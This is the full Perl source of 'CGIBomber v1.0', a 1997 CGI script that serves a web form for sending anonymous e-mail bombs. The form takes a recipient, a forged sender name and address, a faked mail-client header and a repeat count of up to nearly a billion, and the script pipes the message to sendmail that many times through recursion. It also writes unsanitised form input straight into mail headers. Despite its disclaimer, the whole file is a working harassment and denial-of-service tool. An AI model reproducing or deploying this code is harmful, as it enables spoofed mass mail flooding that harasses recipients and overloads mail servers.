#!/usr/bin/perl
###########################################################
#
# CGIBomber v1.0 By: E-HACK
# Copyright © 1997 E-HACK (ehack@wilter.com)
# All Rights Reserved.
#
# A Wiltered Fire Production
# http://www.wilter.com/wf/
#
###########################################################
#
# Define stuff for your server

# The location of your sendmail program, leave the -t
$mailprog = '/usr/sbin/sendmail -t';

# The URL of this script on your server
$script_url = 'http://www.yourdomain.com/cgi-bin/cgi_bomb.cgi';

# Done changing stuff. Do not change anything below this line!
##############################################################





if($ENV{'REQUEST_METHOD'} eq 'POST')
{
	&parse_form;
	$sent = 0;
	$stop = $input{'stop'};
if($stop eq '') { $stop = 1; }
if($stop < 0) { &error; }
if($stop > 999999999) { &error; }

	&return_html;
	&send_mail;
}
else
{
&print_form;
}


sub print_form
{
print "Content-type: text/html\n\n";
print "
<html><head><title>CGIBomber v1.0</title></head>
<body bgcolor=ffffff text=000000 link=000000 alink=000000 vlink=000000>
<center><h1>CGIBomber v1.0</h1></center>
<br><hr><br>
CGIBomber is a fully capable e-mail bomber program. This program was written to
show how simple it is to send anonymous e-mail bombs via a cgi script. This program
is <b>not</b> intended to be used (unlike most people, I really mean that). If
you do use this program, I take no responsibility whatsoever. See the <a href=\"#disc\">disclaimer</a>
below. This program uses large ammounts of system resources, if your sysadmin finds you
running this script you are very likely to lose your account and possibly more. 
I do not endorse e-mail bombing or any other type of harassment.<br>E-HACK


<br><hr><br>
<!--CGIBomber v1.0 By: E-HACK (god@wilter.com)-->
<center>
<form action=\"$script_url\" method=POST>
<table border=5 bgcolor=c0c0c0>
<th colspan=2>CGIBomber v1.0 By: <a href=\"mailto:god@wilter.com\">E-HACK</a></th>
<tr><td>To Address:</td><td><input type=text name=\"to\" size=60></td></tr>
<tr><td>From Address:</td><td><input type=text name=\"from_addy\" size=60></td></tr>
<br><td>From Name:</td><td><input type=text name=\"from_name\" size=60></td></tr>
<tr><td>Subject:</td><td><input type=text name=\"subject\" size=60></td></tr>
<tr><td>Number To Send:</td><td><input type=text name=\"stop\" value=\"1\" size=5></td></tr>
<tr><td colspan=2>Body:<br><textarea name=\"body\" wrap=virtual rows=5 cols=60></textarea></td></tr>
<tr><td colspan=2>
<select name=\"x-mailer\">
<option value=\"\" selected>---------------------=Mailer=---------------------
<option value=\"CGIBomber v1.0\">CGIBomber v1.0
<option value=\"Windows Eudora Light Version 3.0.1 (32)\">Windows Eudora Light Version 3.0.1 (32)
<option value=\"Windows Eudora Light Version 3.0.1 (16)\">Windows Eudora Light Version 3.0.1 (16)
<option value=\"Windows Eudora Version 1.4.4\">Windows Eudora Version 1.4.4
<option value=\"Windows Eudora Light Version 1.5.2\">Windows Eudora Light Version 1.5.2
<option value=\"Eudora Pro Version 3.0 (32)\">Eudora Pro Version 3.0 (32)
<option value=\"Eudora Pro Version 2.2 (32)\">Eudora Pro Version 2.2 (32)
<option value=\"Eudora Pro Version 2.1.2\">Eudora Pro Version 2.1.2
<option value=\"Pegasus Mail for Windows (v2.33)\">Pegasus Mail for Windows (v2.33)
<option value=\"Pegasus Mail for Win32 (v2.42)\">Pegasus Mail for Win32 (v2.42)
<option value=\"Pegasus Mail for Win32 (v2.53/R1)\">Pegasus Mail for Win32 (v2.53/R1)
<option value=\"Mozilla 3.0 (Win16; I)\">Mozilla 3.01 (Win16; I)
<option value=\"Mozilla 3.0 (Win16; I)\">Mozilla 3.0 (Win16; I)
<option value=\"Mozilla 3.01Gold (Win95; I)\">Mozilla 3.01Gold (Win95; I)
<option value=\"Mozilla 4.0b2 (Win95; I)\">Mozilla 4.0b2 (Win95; I)
<option value=\"Mozilla 2.02 (Win95; I)\">Mozilla 2.02 (Win95; I)
<option value=\"Mozilla 3.01Gold (WinNT; I)\">Mozilla 3.01Gold (WinNT; I)
<option value=\"Mozilla 3.01 (X11; I; Linux 2.1.17 i486)\">Mozilla 3.01 (X11; I; Linux 2.1.17 i486)
<option value=\"Mozilla 3.01Gold (X11; U; OSF1 V3.2 alpha)\">Mozilla 3.01Gold (X11; U; OSF1 V3.2 alpha)
<option value=\"Mozilla 3.0 (X11; I; SunOS 5.5.1 sun4m)\">Mozilla 3.0 (X11; I; SunOS 5.5.1 sun4m)
<option value=\"E-mail connection (win32)\">E-mail connection (win32)
<option value=\"Microsoft Internet Mail 4.70.1155\">Microsoft Internet Mail 4.70.1155
<option value=\"Juno 1.00\">Juno 1.00
<option value=\"ELM [version 2.4 PL23]\">ELM [version 2.4 PL23]
<option value=\"Z-Mail (3.2.1 10oct95)\">Z-Mail (3.2.1 10oct95)
</select></td></tr>
<tr><td colspan=2 align=center><BR><BR><input type=submit value=\" Send \">
<input type=reset value=\" Clear \">
</td></tr>
</table></form></center>
<!--CGIBomb v1.0 By: E-HACK (god@wilter.com)-->
<a name=\"disc\"><br><hr><br></a>
Disclaimer:<br>
THIS IS A DISCLAIMER OF LIABILITY RELATING TO YOUR USE OF THIS SOFTWARE
THIS PROGRAM IS DISTRIBUTED \"AS IS,\" WITHOUT ANY IMPLIED OR EXPRESS WARRANTY 
AS TO ITS PERFORMANCE OR AS TO THE RESULTS THAT MAY BE OBTAINED BY ITS USE.  
E-HACK AND WILTERED FIRE ARE NOT LIABLE FOR DIRECT, INDIRECT, OR INCIDENTAL 
DAMAGES FROM ANY DEFECT, MALFUNCTION, INABLILITY OR OMISSION IN THE SOFTWARE 
OR MANUAL OR OTHER RELATED ITEMS AND PROCESSES, INCLUDING BUT NOT LIMITED TO 
SERVICE, LOSS OF BUSINESS, ANTICIPATED PROFIT, OR OTHER CONSEQUENTIAL DAMAGES.
<br><hr><br><font size=2>
CGIBomb v1.0 By: <a href=\"mailto:god@wilter.com\">E-HACK</a>
<br>Copyright © 1997 E-HACK (ehack@wilter.com)
<br>All Rights Reserved.</font>
<br><hr><br>
</body></html>";



}



sub send_mail
{
open (MAIL, "|$mailprog") || die "Can't open $mailprog!\n";
# Headers of the e-mail------------------------------------------
print MAIL "From: $input{'from_name'} \<$input{'from_addy'}\>\n";
print MAIL "Reply-To: $input{'from_addy'}\n";
print MAIL "X-Mailer: $input{'x-mailer'}\n";
print MAIL "To: $input{'to'}\n";
print MAIL "Subject: $input{'subject'}\n";
print MAIL "Content-Type: text/plain; charset=us-ascii\n";
print MAIL "Content-Transfer-Encoding: 7bit\n\n";
# Body of the e-mail---------------------------------------------
print MAIL "$input{'body'}";
close (MAIL);

$sent++;

	if($sent >= $stop)
	{
	exit;
	}
	else
	{
	&send_mail;
	}
}

sub return_html
{
print "Content-type: text/html\n\n";
print "<HTML><HEAD><TITLE>Mail is being sent</TITLE></HEAD><BODY>";
print "<CENTER><H1>Mail is being sent</CENTER></H1>\n";
print "You e-mail is being sent.<br>Here's what you sent:\n";
print "<PRE>";
print "$input{'custom_headers'}\n";
print "From: $input{'from_name'} \<$input{'from_addy'}\>\n";
print "Reply-To: $input{'from_addy'}\n";
print "X-Mailer: $input{'x-mailer'}\n";
print "To: $input{'to'}\n";
print "Subject: $input{'subject'}\n";
print "Content-Type: text/plain; charset=us-ascii\n";
print "Content-Transfer-Encoding: 7bit\n\n";
# Body of the e-mail---------------------------------------------
print "$input{'body'}";
print "</PRE><BR><HR><BR>This e-mail is being sent $input{'stop'} times.\n";
print "<br><hr><br></body></html>\n";
exit;
}

sub parse_form {

   read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
   if (length($buffer) < 5) {
         $buffer = $ENV{QUERY_STRING};
    }
   @pairs = split(/&/, $buffer);
   foreach $pair (@pairs) {
      ($name, $value) = split(/=/, $pair);

	$value =~ tr/+/ /;
	$value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
	$value =~ s/<!--(.|\n)*-->//g;
	$input{$name} = $value;
   }

	if($input{'to'} =~ /wilter.com/) { &error; }
	if($input{'to'} =~ /ilf.net/) { &error; }
	if($input{'to'} =~ /mintprimary.com/) { &error; }
	if($input{'to'} =~ /ziplink.net/) { &error; }
	if($input{'to'} =~ /hotmail.com/) { &error; }
	if($input{'to'} =~ /hack101.com/) { &error; }
	if($input{'to'} =~ /ted.org/) { &error; }
	if($input{'to'} =~ /succeed.net/) { &error; }
}


sub error
{
print "Content-type: text/html\n\n";
print "<HTML><HEAD><TITLE>CGIBomber Error</TITLE></HEAD><BODY>\n";
print "<CENTER><H1>CGIBomber Error</CENTER></H1>\n";
print "<BR>An error occured while processing the script.\n";
print "<BR><HR><BR></BODY></HTML>\n";
exit;
}

